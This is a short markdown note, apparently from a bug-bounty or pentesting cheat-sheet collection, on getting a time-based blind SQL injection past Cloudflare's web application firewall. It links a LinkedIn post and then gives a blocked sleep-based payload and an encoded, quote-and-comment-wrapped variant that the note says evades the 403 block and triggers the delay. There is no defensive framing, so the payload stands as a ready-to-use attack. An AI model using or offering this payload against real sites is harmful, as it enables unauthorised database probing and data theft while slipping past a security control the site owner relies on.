# SQLI


* ## Cloudflare 403 bypass to time-based blind SQLi

   [linked_in_post](https://www.linkedin.com/posts/deepak-saini-cyber_cloudflare-403-bypass-to-time-based-blind-activity-7339491633870065664-yg2e/?utm_source=share&utm_medium=member_android&rcm=ACoAAEvbB6gBsfqHvlwzrauR1IimSlFa7C0L4ok)

  <details>

    Cloudflare 403 bypass to time-based blind SQLi:

    ```css
    PL: (select(0)from(select(sleep(10)))v)   ----→ 403
    but PL: (select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'%5C"%2B(select(0)from(select(sleep(6)))v)   ---→ Time-based Blind SQLi 
    ```

  </details>
